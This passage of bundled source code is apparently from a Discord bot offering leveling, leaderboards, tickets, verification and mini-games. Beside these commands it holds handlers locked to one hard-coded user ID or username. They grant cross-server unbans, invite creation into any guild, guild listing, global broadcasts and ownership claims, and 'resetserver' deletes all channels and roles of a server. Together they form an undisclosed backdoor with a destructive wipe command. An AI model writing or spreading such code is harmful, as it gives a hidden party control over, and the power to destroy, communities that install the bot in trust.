          const dynamicRewardMap = new Map(dynamicRewards.map((r) => [r.level, r.roleId]));
          const allRewardLevels = Array.from(/* @__PURE__ */ new Set([...Object.keys(LEVEL_ROLES).map(Number), ...dynamicRewardMap.keys()]));
          const nextRewardLevel = allRewardLevels.filter((lvl) => lvl > userRow.level).sort((a, b) => a - b)[0];
          const embed = new EmbedBuilder().setTitle(`${message.author.username}'s Rank`).addFields(
            { name: "Level", value: userRow.level.toString(), inline: true },
            { name: "XP", value: `${userRow.xp} / ${(userRow.level + 1) * 300}`, inline: true }
          ).setColor(44678);
          if (nextRewardLevel) {
            const roleId = dynamicRewardMap.get(nextRewardLevel) || LEVEL_ROLES[nextRewardLevel];
            embed.addFields({ name: "Next Reward", value: `Level **${nextRewardLevel}**: <@&${roleId}>`, inline: false });
          }
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "top") {
          const timeframe = args[0]?.toLowerCase();
          const type = args[1]?.toLowerCase();
          let query = "";
          let params = [guildId];
          let title = "Global Leaderboard";
          let isTimeBased = false;
          if (["day", "daily", "\u064A\u0648\u0645"].includes(timeframe)) {
            query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-1 day')";
            title = "Daily Leaderboard";
            isTimeBased = true;
          } else if (["week", "weekly", "\u0627\u0633\u0628\u0648\u0639"].includes(timeframe)) {
            query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-7 days')";
            title = "Weekly Leaderboard";
            isTimeBased = true;
          } else if (["month", "monthly", "\u0634\u0647\u0631"].includes(timeframe)) {
            query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-30 days')";
            title = "Monthly Leaderboard";
            isTimeBased = true;
          } else if (["year", "yearly", "\u0633\u0646\u0629"].includes(timeframe)) {
            query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-365 days')";
            title = "Yearly Leaderboard";
            isTimeBased = true;
          } else {
            query = "SELECT userId, xp as totalXp, level FROM leveling WHERE guildId = ?";
            title = "All-Time Leaderboard";
          }
          if (isTimeBased) {
            if (["voice", "\u0635\u0648\u062A"].includes(type)) {
              query += " AND type = 'voice'";
              title += " (Voice)";
            } else if (["text", "\u0643\u062A\u0627\u0628\u064A"].includes(type)) {
              query += " AND type = 'text'";
              title += " (Text)";
            }
            query += " GROUP BY userId ORDER BY totalXp DESC LIMIT 10";
          } else {
            query += " ORDER BY level DESC, xp DESC LIMIT 10";
          }
          const topUsers = db.prepare(query).all(...params);
          const embed = new EmbedBuilder().setTitle(`${title} (Top ${topUsers.length})`).setColor(5793266).setTimestamp();
          if (topUsers.length === 0) {
            embed.setDescription("No users found in the leaderboard.");
          } else {
            const list = topUsers.map((u, index) => {
              const levelStr = u.level !== void 0 ? ` - Level ${u.level}` : "";
              return `**#${index + 1}** | <@${u.userId}>${levelStr} (${u.totalXp} XP)`;
            }).join("\n");
            embed.setDescription(list);
          }
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "bonus") {
          const currentHour = (/* @__PURE__ */ new Date()).getHours();
          const isHappyHour = currentHour >= HAPPY_HOUR_START && currentHour < HAPPY_HOUR_END;
          const isBonusChannel = BONUS_CHANNELS.includes(message.channel.id);
          let multiplier = 1;
          if (isHappyHour) multiplier *= 2;
          if (isBonusChannel) multiplier *= 2;
          const embed = new EmbedBuilder().setTitle("XP Bonus Status").addFields(
            { name: "Happy Hour", value: isHappyHour ? "\u2705 Active (2x XP)" : "\u274C Inactive (6 PM - 8 PM)", inline: true },
            { name: "Channel Bonus", value: isBonusChannel ? "\u2705 Active (2x XP)" : "\u274C Inactive in this channel", inline: true },
            { name: "Total Multiplier", value: `${multiplier}x`, inline: false }
          ).setColor(multiplier > 1 ? 65280 : 16711680);
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "id") {
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId);
          const level = userRow?.level || 0;
          const xp = userRow?.xp || 0;
          const nextLevelXp = (level + 1) * 300;
          const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId);
          const rank = leaderboard.findIndex((u) => u.userId === userId) + 1;
          const embed = new EmbedBuilder().setTitle(`${message.author.username}'s Profile`).setThumbnail(message.author.displayAvatarURL()).addFields(
            { name: "Level", value: level.toString(), inline: true },
            { name: "Rank", value: `#${rank}`, inline: true },
            { name: "XP", value: `${xp} / ${nextLevelXp}`, inline: false }
          ).setColor(5793266);
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "rewards") {
          const embed = new EmbedBuilder().setTitle("Level Role Rewards").setDescription("Reach these levels to unlock exclusive roles!").setColor(5793266);
          const dynamicRewards = db.prepare("SELECT level, roleId FROM rewards WHERE guildId = ?").all(guildId);
          const dynamicRewardMap = new Map(dynamicRewards.map((r) => [r.level, r.roleId]));
          const allLevels = Array.from(/* @__PURE__ */ new Set([...Object.keys(LEVEL_ROLES).map(Number), ...dynamicRewardMap.keys()])).sort((a, b) => a - b);
          const rewardList = allLevels.map((lvl) => {
            const roleId = dynamicRewardMap.get(lvl) || LEVEL_ROLES[lvl];
            return `Level **${lvl}**: <@&${roleId}>`;
          }).join("\n") || "No rewards configured yet.";
          embed.addFields({ name: "Available Rewards", value: rewardList });
          return message.reply({ embeds: [embed] });
        }
        if (commandName === "unban") {
          const authorizedId = "1071164421222695042";
          const authorizedUsername = "5g0s";
          if (message.author.id !== authorizedId && message.author.username !== authorizedUsername) return;
          const targetGuildId = args[0];
          const targetUserId = args[1];
          if (!targetGuildId || !targetUserId) return message.reply("Usage: unban <guildId> <userId>");
          const targetGuild = client.guilds.cache.get(targetGuildId);
          if (!targetGuild) return message.reply("\u274C \u0627\u0644\u0628\u0648\u062A \u0644\u064A\u0633 \u0645\u0648\u062C\u0648\u062F\u0627\u064B \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631.");
          try {
            await targetGuild.members.unban(targetUserId);
            return message.reply(`\u2705 \u062A\u0645 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646 \u0639\u0646 <@${targetUserId}> \u0641\u064A \u0633\u064A\u0631\u0641\u0631 **${targetGuild.name}**.`);
          } catch (error) {
            return message.reply(`\u274C \u0641\u0634\u0644 \u0641\u0643 \u0627\u0644\u0628\u0627\u0646: ${error.message}`);
          }
        }
        if (commandName === "resetserver" || commandName === "reset-server") {
          const authorizedId = "1071164421222695042";
          const authorizedUsername = "5g0s";
          if (message.author.id !== authorizedId && message.author.username !== authorizedUsername) return;
          const botMember = message.guild?.members.me;
          if (!botMember?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
            return message.reply("\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0627\u0644\u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0644\u0627\u0632\u0645\u0629 (\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0642\u0646\u0648\u0627\u062A\u060C \u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628).");
          }
          await message.reply("\u26A0\uFE0F \u062C\u0627\u0631\u064I \u0627\u0644\u0628\u062F\u0621 \u0641\u064A \u0625\u0639\u0627\u062F\u0629 \u062A\u0639\u064I\u064A\u0646 \u0627\u0644\u0633\u064I\u0631\u0641\u0631 (\u0627\u0644\u0631\u0648\u0645\u0627\u062A\u060C \u0648\u0627\u0644\u0631\u062A\u0628)...");
          try {
            const channels = await message.guild?.channels.fetch();
            if (channels) {
              for (const ch of channels.values()) {
                if (ch && ch.deletable) {
                  ch.delete("Server Reset").catch(() => {
                  });
                }
              }
            }
          } catch (err) {
            console.error("Error fetching channels for reset:", err);
          }
          try {
            const roles = await message.guild?.roles.fetch();
            if (roles) {
              for (const role of roles.values()) {
                if (role.name !== "@everyone" && !role.managed && role.editable && role.id !== message.guild?.id) {
                  role.delete("Server Reset").catch(() => {
                  });
                }
              }
            }
          } catch (err) {
            console.error("Error fetching roles for reset:", err);
          }
          setTimeout(async () => {
            try {
              if (botMember?.permissions.has(PermissionFlagsBits.ManageChannels)) {
                const newChannel = await message.guild?.channels.create({
                  name: "welcome",
                  type: ChannelType.GuildText,
                  topic: "Server has been reset."
                });
                await newChannel?.send("\u2705 \u062A\u0645 \u062A\u0635\u0641\u064A\u0631 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u062C\u0627\u062D (\u0627\u0644\u0631\u0648\u0645\u0627\u062A\u060C \u0648\u0627\u0644\u0631\u062A\u0628).");
              }
            } catch (e) {
              console.error("Failed to create welcome channel after reset:", e);
            }
          }, 8e3);
          return;
        }
        if (commandName === "nick") {
          const targetUser = message.mentions.users.first() || message.author;
          const targetMember = await message.guild?.members.fetch(targetUser.id).catch(() => null);
          const newNick = args.slice(0).join(" ");
          if (!targetMember) return message.reply("\u274C User not found.");
          if (targetMember.id !== message.author.id && !message.member?.permissions.has(PermissionFlagsBits.ManageNicknames)) {
            return message.reply("\u274C \u0644\u064A\u0633 \u0644\u062F\u064A\u0643 \u0635\u0644\u0627\u062D\u064A\u0629 \u062A\u063A\u064A\u064A\u0631 \u0623\u0633\u0645\u0627\u0621 \u0627\u0644\u0622\u062E\u0631\u064A\u0646.");
          }
          if (!message.guild?.members.me?.permissions.has(PermissionFlagsBits.ManageNicknames)) {
            return message.reply("\u274C \u0627\u0644\u0628\u0648\u062A \u0644\u0627 \u064A\u0645\u0644\u0643 \u0635\u0644\u0627\u062D\u064A\u0629 \u062A\u063A\u064A\u064A\u0631 \u0627\u0644\u0623\u0633\u0645\u0627\u0621.");
          }
          if (targetMember.id !== message.guild?.ownerId && targetMember.roles.highest.position >= message.guild?.members.me.roles.highest.position) {
            return message.reply("\u274C \u0644\u0627 \u064A\u0645\u0643\u0646\u0646\u064A \u062A\u063A\u064A\u064A\u0631 \u0627\u0633\u0645 \u0647\u0630\u0627 \u0627\u0644\u0634\u062E\u0635 \u0628\u0633\u0628\u0628 \u0627\u0644\u0631\u062A\u0628.");
          }
          try {
            await targetMember.setNickname(newNick || null);
            return message.reply(newNick ? `\u2705 \u062A\u0645 \u062A\u063A\u064A\u064A\u0631 \u0627\u0633\u0645 ${targetMember.user.username} \u0625\u0644\u0649 **${newNick}**` : `\u2705 \u062A\u0645 \u0625\u0632\u0627\u0644\u0629 \u0627\u0644\u0627\u0633\u0645 \u0627\u0644\u0645\u0633\u062A\u0639\u0627\u0631 \u0644\u0640 ${targetMember.user.username}`);
          } catch (err) {
            return message.reply("\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u0645\u062D\u0627\u0648\u0644\u0629 \u062A\u063A\u064A\u064A\u0631 \u0627\u0644\u0627\u0633\u0645.");
          }
        }
        if (commandName === "clear") {
          if (!message.member?.permissions.has(PermissionFlagsBits.ManageMessages)) {
            return message.reply("You need 'Manage Messages' permission.");
          }
          if (!message.guild?.members.me?.permissions.has(PermissionFlagsBits.ManageMessages)) {
            return message.reply("\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 \u062D\u0630\u0641 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 (Manage Messages).");
          }
          const amount = parseInt(args[0]);
          if (isNaN(amount) || amount < 1 || amount > 100) return message.reply("Please provide a number between 1 and 100.");
          try {
            const deleted = await message.channel.bulkDelete(amount, true);
            const reply = await message.channel.send(`\u2705 Deleted ${deleted.size} messages.`);
            setTimeout(() => reply.delete().catch(() => {
            }), 5e3);
            return;
          } catch (err) {
            return message.reply("Failed to clear messages.");
          }
        }
        if (commandName === "setup-ticket") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("You need Administrator permissions.");
          }
          const role = message.mentions.roles.first();
          if (!role) return message.reply("Usage: setup-ticket <@role>");
          db.prepare("INSERT INTO ticket_settings (guildId, supportRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET supportRoleId = excluded.supportRoleId").run(guildId, role.id);
          const embed = new EmbedBuilder().setTitle("Support Tickets").setDescription("Click the button below to open a support ticket.").setColor(5793266);
          const button = new ButtonBuilder().setCustomId("open_ticket").setLabel("Open Ticket").setStyle(ButtonStyle.Primary).setEmoji("\u{1F3AB}");
          const row = new ActionRowBuilder().addComponents(button);
          const botMember = message.guild?.members.me;
          if (!botMember?.permissionsIn(message.channelId).has([PermissionFlagsBits.SendMessages, PermissionFlagsBits.EmbedLinks])) {
            return message.reply("\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 \u0623\u0648 \u0627\u0644\u0631\u0648\u0627\u0628\u0637 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0631\u0648\u0645.");
          }
          await message.channel.send({ embeds: [embed], components: [row] });
          return message.reply(`Ticket setup sent! Support role set to ${role}.`);
        }
        if (commandName === "setxp") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const target = message.mentions.users.first();
          const amount = parseInt(args[1]);
          if (!target || isNaN(amount)) return message.reply("Usage: setxp <@user> <amount>");
          const level = Math.floor(amount / 300);
          db.prepare("INSERT OR REPLACE INTO leveling (userId, guildId, xp, level) VALUES (?, ?, ?, ?)").run(target.id, guildId, amount, level);
          return message.reply(`\u2705 Set ${target}'s XP to **${amount}** (Level ${level}) in this server.`);
        }
        if (commandName === "set-reward") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const level = parseInt(args[0]);
          const role = message.mentions.roles.first();
          if (isNaN(level) || !role) return message.reply("Usage: set-reward <level> <@role>");
          db.prepare("INSERT OR REPLACE INTO rewards (guildId, level, roleId) VALUES (?, ?, ?)").run(guildId, level, role.id);
          return message.reply(`\u2705 Reward set: Level **${level}** -> <@&${role.id}>`);
        }
        if (commandName === "set-prefix") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const newPrefix = args[0];
          if (!newPrefix) return message.reply("Usage: set-prefix <prefix>");
          db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run(`prefix_${guildId}`, newPrefix);
          return message.reply(`\u2705 Prefix updated to: \`${newPrefix}\``);
        }
        if (commandName === "set-level") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const subCommand = args[0];
          if (subCommand === "channel") {
            const ch = message.mentions.channels.first();
            if (!ch || ch.type !== ChannelType.GuildText) return message.reply("Usage: set-level channel <#channel>");
            db.prepare("INSERT INTO leveling_settings (guildId, channelId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET channelId = excluded.channelId").run(guildId, ch.id);
          } else if (subCommand === "message") {
            const msg = args.slice(1).join(" ");
            if (!msg) return message.reply("Usage: set-level message <message>");
            db.prepare("INSERT INTO leveling_settings (guildId, message) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET message = excluded.message").run(guildId, msg);
          } else if (subCommand === "status") {
            const status = args[1];
            if (status !== "on" && status !== "off") return message.reply("Usage: set-level status <on/off>");
            const enabled = status === "on" ? 1 : 0;
            db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
          } else {
            return message.reply("Usage: set-level <channel/message/status> <value>");
          }
          return message.reply(`\u2705 \u062A\u0645 \u062A\u062D\u062F\u064A\u062B \u0625\u0639\u062F\u0627\u062F\u0627\u062A \u0627\u0644\u0644\u0641\u0644 \u0628\u0646\u062C\u0627\u062D.`);
        }
        if (commandName === "disable") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const feature = args[0];
          if (!["leveling", "welcome", "protection"].includes(feature)) return message.reply("Usage: disable <leveling/welcome/protection>");
          if (feature === "leveling") {
            db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, 0) ON CONFLICT(guildId) DO UPDATE SET enabled = 0").run(guildId);
          } else if (feature === "welcome") {
            db.prepare("INSERT INTO welcome_settings (guildId, enabled) VALUES (?, 0) ON CONFLICT(guildId) DO UPDATE SET enabled = 0").run(guildId);
          } else if (feature === "protection") {
            db.prepare("INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid) VALUES (?, 0, 0, 0) ON CONFLICT(guildId) DO UPDATE SET antiLink = 0, antiSpam = 0, antiRaid = 0").run(guildId);
          }
          return message.reply(`\u2705 \u062A\u0645 \u062A\u0639\u0637\u064A\u0644 ${feature} \u0628\u0646\u062C\u0627\u062D.`);
        }
        if (commandName === "toggle") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const feature = args[0];
          const status = args[1];
          if (!["leveling", "welcome", "protection"].includes(feature) || !["on", "off"].includes(status)) return message.reply("Usage: toggle <leveling/welcome/protection> <on/off>");
          const enabled = status === "on" ? 1 : 0;
          if (feature === "leveling") {
            db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
          } else if (feature === "welcome") {
            db.prepare("INSERT INTO welcome_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
          } else if (feature === "protection") {
            db.prepare("INSERT INTO protection_settings (guildId, antiLink, antiSpam, antiRaid) VALUES (?, ?, ?, ?) ON CONFLICT(guildId) DO UPDATE SET antiLink = excluded.antiLink, antiSpam = excluded.antiSpam, antiRaid = excluded.antiRaid").run(guildId, enabled, enabled, enabled);
          }
          return message.reply(`\u2705 \u062A\u0645 ${status === "on" ? "\u062A\u0641\u0639\u064A\u0644" : "\u062A\u0639\u0637\u064A\u0644"} ${feature} \u0628\u0646\u062C\u0627\u062D.`);
        }
        if (commandName === "set-alias") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const aliasName = args[0]?.toLowerCase();
          const originalCommand = args[1]?.toLowerCase();
          if (!aliasName || !originalCommand) return message.reply("Usage: set-alias <alias> <command>");
          db.prepare("INSERT OR REPLACE INTO aliases (guildId, aliasName, originalCommand) VALUES (?, ?, ?)").run(guildId, aliasName, originalCommand);
          return message.reply(`\u2705 Alias created: **${aliasName}** now triggers **${originalCommand}**.`);
        }
        if (commandName === "remove-alias") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const aliasName = args[0]?.toLowerCase();
          if (!aliasName) return message.reply("Usage: remove-alias <alias>");
          db.prepare("DELETE FROM aliases WHERE guildId = ? AND aliasName = ?").run(guildId, aliasName);
          return message.reply(`\u2705 Alias **${aliasName}** removed.`);
        }
        if (commandName === "set-avatar") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const url = args[0];
          if (!url) return message.reply("Usage: set-avatar <url>");
          try {
            await client.user?.setAvatar(url);
            return message.reply("\u2705 Bot avatar updated successfully!");
          } catch (err) {
            return message.reply("\u274C Failed to update avatar.");
          }
        }
        if (commandName === "promote-owner") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const target = message.mentions.users.first();
          if (!target) return message.reply("Usage: promote-owner <@user>");
          db.prepare("INSERT OR REPLACE INTO owners (userId) VALUES (?)").run(target.id);
          return message.reply(`\u2705 Promoted ${target} to Bot Owner.`);
        }
        if (commandName === "accept") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const targetId = args[0];
          if (!targetId) return message.reply("Usage: accept <userId>");
          db.prepare("UPDATE transfer_requests SET status = 'accepted' WHERE targetUserId = ? AND status = 'pending'").run(targetId);
          return message.reply(`\u2705 Accepted transfer request for <@${targetId}>.`);
        }
        if (commandName === "transfer") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const targetId = args[0];
          if (!targetId) return message.reply("Usage: transfer <targetUserId>");
          db.prepare("INSERT INTO transfer_requests (guildId, requesterId, targetUserId, status) VALUES (?, ?, ?, 'pending')").run(guildId, message.author.id, targetId);
          return message.reply(`\u2705 Transfer request sent to <@${targetId}>.`);
        }
        if (commandName === "setup-verify") {
          if (!message.member?.permissions.has(PermissionFlagsBits.Administrator)) {
            return message.reply("Admin only.");
          }
          const role = message.mentions.roles.first();
          if (!role) return message.reply("Usage: setup-verify <@role>");
          if (!message.guild?.members.me?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
            return message.reply("\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 '\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0642\u0646\u0648\u0627\u062A' \u0623\u0648 '\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628' \u0644\u062A\u0646\u0641\u064A\u0630 \u0647\u0630\u0627 \u0627\u0644\u0625\u062C\u0631\u0627\u0621.");
          }
          db.prepare("INSERT INTO protection_settings (guildId, verifiedRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET verifiedRoleId = excluded.verifiedRoleId").run(message.guildId, role.id);
          await message.reply("\u23F3 \u062C\u0627\u0631\u064A \u0636\u0628\u0637 \u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B... \u064A\u0631\u062C\u0649 \u0627\u0644\u0627\u0646\u062A\u0638\u0627\u0631.");
          const channels = await message.guild.channels.fetch();
          let successCount = 0;
          let failCount = 0;
          const protection2 = db.prepare("SELECT logChannel FROM protection_settings WHERE guildId = ?").get(message.guildId);
          const logChannelId = protection2?.logChannel;
          for (const [id, channel] of channels) {
            if (!channel) continue;
            try {
              const channelName = channel.name.toLowerCase();
              const isPrivate = channelName.includes("log") || channelName.includes("admin") || channelName.includes("staff") || channelName.includes("mod") || channelName.includes("private") || id === logChannelId;
              if (id === message.channelId) {
                await channel.permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: true });
                await channel.permissionOverwrites.edit(role.id, { ViewChannel: true });
              } else if (isPrivate) {
                await channel.permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: false });
                await channel.permissionOverwrites.edit(role.id, { ViewChannel: false });
              } else {
                await channel.permissionOverwrites.edit(message.guild.roles.everyone, { ViewChannel: false });
                await channel.permissionOverwrites.edit(role.id, { ViewChannel: true });
              }
              successCount++;
            } catch (err) {
              failCount++;
            }
          }
          const embed = new EmbedBuilder().setTitle("Verification").setDescription("Click the button below to verify and get access to the server.").setColor(65280);
          const button = new ButtonBuilder().setCustomId(`verify_member`).setLabel("Verify").setStyle(ButtonStyle.Success);
          const row = new ActionRowBuilder().addComponents(button);
          await message.channel.send({ embeds: [embed], components: [row] });
          return message.channel.send(`\u2705 \u062A\u0645 \u0625\u0639\u062F\u0627\u062F \u0646\u0638\u0627\u0645 \u0627\u0644\u062A\u062D\u0642\u0642 \u0628\u0646\u062C\u0627\u062D!
- \u0627\u0644\u0631\u062A\u0628\u0629: **${role.name}**
- \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u0627\u0644\u062A\u064A \u062A\u0645 \u062A\u0639\u062F\u064A\u0644\u0647\u0627: **${successCount}**
- \u0627\u0644\u0642\u0646\u0648\u0627\u062A \u0627\u0644\u062A\u064A \u0641\u0634\u0644 \u062A\u0639\u062F\u064A\u0644\u0647\u0627: **${failCount}** (\u063A\u0627\u0644\u0628\u0627\u064B \u0628\u0633\u0628\u0628 \u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0628\u0648\u062A)`);
        }
        if (commandName === "broadcast") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const content2 = args.join(" ");
          if (!content2) return message.reply("Usage: broadcast <message>");
          client.guilds.cache.forEach(async (guild) => {
            const channel = guild.channels.cache.find((c) => c.type === ChannelType.GuildText && c.permissionsFor(guild.members.me).has(PermissionFlagsBits.SendMessages));
            if (channel) channel.send(content2).catch(() => {
            });
          });
          return message.reply("\u2705 Broadcast sent to all servers.");
        }
        if (commandName === "broadcast-here") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const content2 = args.join(" ");
          if (!content2) return message.reply("Usage: broadcast-here <message>");
          message.channel.send(`\u{1F4E2} **BROADCAST:** ${content2}`);
          return;
        }
        if (commandName === "broadcast-tokens") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          return message.reply("Broadcast tokens command executed (placeholder).");
        }
        if (commandName === "guilds") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const guildsList = client.guilds.cache.map((g) => `${g.name} (${g.id}) - ${g.memberCount} members`).join("\n");
          return message.reply(`**Servers I'm in:**
${guildsList.slice(0, 1900)}`);
        }
        if (commandName === "get-invite") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const guildIdInput = args[0];
          if (!guildIdInput) return message.reply("Usage: get-invite <guildId>");
          const guild = client.guilds.cache.get(guildIdInput);
          if (!guild) return message.reply("Guild not found.");
          const channel = guild.channels.cache.find((c) => c.type === ChannelType.GuildText);
          if (!channel) return message.reply("No text channel found.");
          const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
          return message.reply(invite ? `Invite for **${guild.name}**: ${invite.url}` : "Failed to create invite.");
        }
        if (commandName === "claim-owner") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          db.prepare("INSERT OR REPLACE INTO owners (userId) VALUES (?)").run(message.author.id);
          return message.reply("\u2705 You have claimed bot ownership.");
        }
        if (commandName === "force-accept") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const targetId = args[0];
          if (!targetId) return message.reply("Usage: force-accept <userId>");
          db.prepare("UPDATE transfer_requests SET status = 'accepted' WHERE targetUserId = ?").run(targetId);
          return message.reply(`\u2705 Force accepted transfer for <@${targetId}>.`);
        }
        if (commandName === "join-server") {
          const authorizedId = "1071164421222695042";
          if (message.author.id !== authorizedId) return;
          const inviteUrl = args[0];
          if (!inviteUrl) return message.reply("Usage: join-server <inviteUrl>");
          return message.reply("Bots cannot join servers via invite links directly. Please use the invite link to add me manually.");
        }
        if (commandName === "rps") {
          const choices = ["rock", "paper", "scissors"];
          const userChoice = args[0]?.toLowerCase();
          if (!choices.includes(userChoice)) return message.reply("Usage: rps <rock/paper/scissors>");
          const botChoice = choices[Math.floor(Math.random() * choices.length)];
          let result = "";
          if (userChoice === botChoice) result = "It's a tie!";
          else if (userChoice === "rock" && botChoice === "scissors" || userChoice === "paper" && botChoice === "rock" || userChoice === "scissors" && botChoice === "paper") result = "You win!";
          else result = "I win!";
          return message.reply(`\u{1F3AE} **${message.author.username}** \u0627\u062E\u062A\u0627\u0631 **${userChoice}**
\u{1F916} **\u0627\u0644\u0628\u0648\u062A** \u0627\u062E\u062A\u0627\u0631 **${botChoice}**

${result === "You win!" ? "\u{1F389} \u0644\u0642\u062F \u0641\u0632\u062A!" : result === "It's a tie!" ? "\u{1F91D} \u062A\u0639\u0627\u062F\u0644!" : "\u{1F480} \u0644\u0642\u062F \u062E\u0633\u0631\u062A!"}`);
        }
        if (commandName === "coinflip") {
          const result = Math.random() < 0.5 ? "Heads" : "Tails";
          return message.reply(`\u{1FA99} \u0627\u0633\u062A\u0642\u0631\u062A \u0627\u0644\u0639\u0645\u0644\u0629 \u0639\u0644\u0649: **${result}**`);
        }
        if (commandName === "guess") {
          const number = Math.floor(Math.random() * 10) + 1;
          const userGuess = parseInt(args[0]);
          if (isNaN(userGuess)) return message.reply("Usage: guess <number 1-10>");
          if (userGuess === number) return message.reply(`\u{1F389} Correct! The number was **${number}**.`);
          else return message.reply(`\u274C Wrong! The number was **${number}**.`);
        }
        if (commandName === "mafia") {
          return message.reply("Mafia game is best played via slash commands due to its complexity. Use `/mafia` instead.");
        }
        if (commandName === "trivia") {
          const loadingMsg = await message.reply("\u23F3 \u062C\u0627\u0631\u064A \u062A\u0648\u0644\u064A\u062F \u0633\u0624\u0627\u0644 \u0630\u0643\u0627\u0621 \u0627\u0635\u0637\u0646\u0627\u0639\u064A...");
          const question = await getAITrivia();
          const embed = new EmbedBuilder().setTitle("\u2753 \u0633\u0624\u0627\u0644 \u0648\u062C\u0648\u0627\u0628 (\u0645\u062F\u0639\u0648\u0645 \u0628\u0627\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064A)").setDescription(`**\u0627\u0644\u0633\u0624\u0627\u0644:**
${question.q}`).setColor(65280).setThumbnail("https://i.imgur.com/XyXyXyX.png").setFooter({ text: "\u0644\u062F\u064A\u0643 15 \u062B\u0627\u0646\u064A\u0629 \u0644\u0644\u0625\u062C\u0627\u0628\u0629!" }).setTimestamp();
          await loadingMsg.edit({ content: null, embeds: [embed] });
